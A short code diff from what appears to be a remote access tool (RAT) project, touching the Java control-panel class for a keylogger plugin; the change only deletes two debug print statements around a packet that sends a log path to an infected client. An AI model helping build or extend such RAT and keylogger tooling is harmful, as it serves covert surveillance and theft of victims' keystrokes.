@@ -133,9 +133,7 @@ public class PanelKeylogger extends BaseControlPanel {
 						getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getServer()) {
 							@Override
 							public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
-								System.out.println("WRITE UTF");
 								dos.writeUTF(finalPath);
-								System.out.println("WROTE UTF");
 							}
 						});
 					} catch (Exception e) {
